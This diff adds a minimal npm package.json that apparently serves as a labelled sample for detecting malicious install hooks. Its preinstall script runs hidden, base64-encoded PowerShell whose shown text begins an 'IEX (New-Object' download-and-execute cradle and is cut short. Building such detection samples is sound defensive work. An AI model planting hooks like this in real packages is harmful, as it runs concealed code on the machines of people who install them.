@@ -1,0 +1,10 @@
+{
+  "name": "preinstall-powershell-enc",
+  "version": "1.0.0",
+  "description": "preinstall runs encoded PowerShell",
+  "main": "index.js",
+  "license": "MIT",
+  "scripts": {
+    "preinstall": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+  }
+}
